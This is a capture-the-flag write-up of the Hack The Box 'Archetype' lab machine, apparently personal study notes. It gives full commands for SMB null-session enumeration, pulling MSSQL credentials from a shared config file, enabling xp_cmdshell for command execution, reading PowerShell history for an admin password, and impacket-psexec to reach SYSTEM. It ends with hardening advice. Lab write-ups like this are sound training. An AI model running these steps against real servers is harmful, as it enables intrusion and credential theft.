# Archetype

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 2) |
| **OS** | Windows |
| **Difficulty** | Very Easy |
| **Techniques** | SMB null session, MSSQL xp_cmdshell, PowerShell history looting, Impacket psexec (SYSTEM) |

## Overview
A full Windows creds-to-SYSTEM chain and one of the most OSCP-relevant patterns in the
set. An anonymous SMB share leaks an MSSQL service-account password; MSSQL
`xp_cmdshell` gives OS command execution; the administrator password is sitting in
PowerShell history; Impacket psexec finishes it as SYSTEM.

## Enumeration
```bash
nmap -p- --min-rate 1000 <TARGET_IP>
nmap -sC -sV -p 135,139,445,1433 <TARGET_IP>   # SMB + 1433 MSSQL
smbclient -N -L //<TARGET_IP>                  # null session: 'backups' share
smbclient -N //<TARGET_IP>/backups -c "get prod.dtsConfig"
cat prod.dtsConfig        # connection string: User ID=ARCHETYPE\sql_svc; Password=...
```

## Exploitation (foothold)
```bash
impacket-mssqlclient ARCHETYPE/sql_svc@<TARGET_IP> -windows-auth
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');            -- 1 = sysadmin
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';                      -- RCE as archetype\sql_svc
```

## Privilege Escalation
```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt';
```
PowerShell history contained a command run as administrator with the password inline.
Then, on the attack box:
```bash
impacket-psexec administrator@<TARGET_IP>            # -> NT AUTHORITY\SYSTEM
```

## Key Takeaway
Run SQL Server as a low-privilege account, keep `xp_cmdshell` disabled, and apply least
privilege to DB roles. Never type passwords inline in PowerShell (they persist in
PSReadline history), and never reuse service/admin passwords.

## What tripped me up
The Impacket login first failed and fell back to `ARCHETYPE\Guest` because I used a
backslash in `ARCHETYPE\sql_svc`; bash ate the `\`. The fix is a forward slash
(`ARCHETYPE/sql_svc`) or quoting. PowerShell history as a credential store is the real
lesson here: it is the Windows equivalent of `~/.bash_history`, and winPEAS would flag
it, but knowing to check it manually is faster when you already have a lead.
